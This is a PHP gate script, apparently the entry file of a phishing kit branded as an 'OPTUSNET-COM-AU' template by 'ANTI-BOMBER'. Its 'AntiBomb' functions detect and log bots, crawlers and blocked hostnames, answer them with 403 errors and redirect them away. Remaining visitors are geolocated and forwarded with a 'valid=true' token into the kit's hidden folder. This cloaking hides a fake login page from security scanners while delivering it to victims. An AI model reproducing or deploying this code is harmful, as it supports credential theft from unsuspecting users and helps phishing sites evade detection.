<?php
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : ANƬƖ-ƁƠMƁЄƦ 
* [A][и][T][Ɩ] [в][σ][м][в][є][я] Template Name    : O|P|T|U|S|N|E|T|-|C|O|M|-|A|U|
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Template Version : V.1.1 By 🄰🄽🅃🄸-🄱🄾🄼🄱🄴🅁  
===========================================================================*/
	/* Require Files */
	$page = 'check';
    require_once './F004f19441/init.php';

if(AntiBomb_User($user) == true || AntiBomb_Boot($user) == true):
	AntiBomb_BootList($user);
    header("HTTP/1.1 403 Forbidden");
    die(rediret($link2)); /* We're done here */

elseif(AntiBomb_WordBoot($user) == true):
	AntiBomb_BootHostname($user);
    header("HTTP/1.1 403 Forbidden");
    die(rediret($link2)); /* We're done here */

elseif(AntiBomb_User($user) == true || AntiBomb_Block($user) == true):
    header("HTTP/1.1 403 Forbidden");
    die(rediret($link)); /* We're done here */
else:
	$rootFolder='F004f19441';
	getLocation($user);
	_AntiBomb_User($user);
	die(rediret('./'.$rootFolder.'/index.php?valid=true&'.$id)); /* We're done here */
	ob_end_flush();
endif;
?>